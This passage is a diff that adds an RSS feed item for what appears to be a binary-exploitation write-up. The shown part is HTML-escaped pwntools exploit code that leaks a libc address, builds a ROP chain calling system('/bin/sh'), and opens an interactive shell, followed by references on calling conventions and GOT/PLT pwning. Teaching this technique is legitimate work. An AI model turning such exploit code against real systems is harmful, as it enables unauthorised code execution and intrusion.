+leaked_puts &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; raw_data&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ljust(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# fill missing bytes with zeroes&lt;/span&gt;
+leaked_puts &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;u64(leaked_puts)
+pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;success(f&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Leaked puts: {leaked_puts:x}&amp;#39;&lt;/span&gt;)
+
+
+pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Stage 2, ret2shell&amp;#34;&lt;/span&gt;)
+&lt;span style=&#34;color:#75715e&#34;&gt;# calculate offset, base address of the libc in the memory&lt;/span&gt;
+libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; leaked_puts &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;symbols[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;puts&amp;#39;&lt;/span&gt;]
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# prepare the final payload&lt;/span&gt;
+rop &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ROP(libc)
+rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;call(rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;find_gadget([&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ret&amp;#39;&lt;/span&gt;]))
+rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;call(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;symbols[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;system&amp;#39;&lt;/span&gt;], [next(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;search(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/sh&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;))])
+payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join([fill, rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;chain()])
+
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)
+pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;success(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Have fun!&amp;#34;&lt;/span&gt;)
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;references&#34;&gt;References&lt;/h2&gt;
+&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
+&lt;hr&gt;
+&lt;ol&gt;
+&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.agner.org/optimize/calling_conventions.pdf&#34;&gt;https://www.agner.org/optimize/calling_conventions.pdf&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&#34;fn:2&#34; role=&#34;doc-endnote&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html&#34;&gt;https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:2&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/section&gt;</content>
+    </item>
+    
+  </channel>
+</rss>
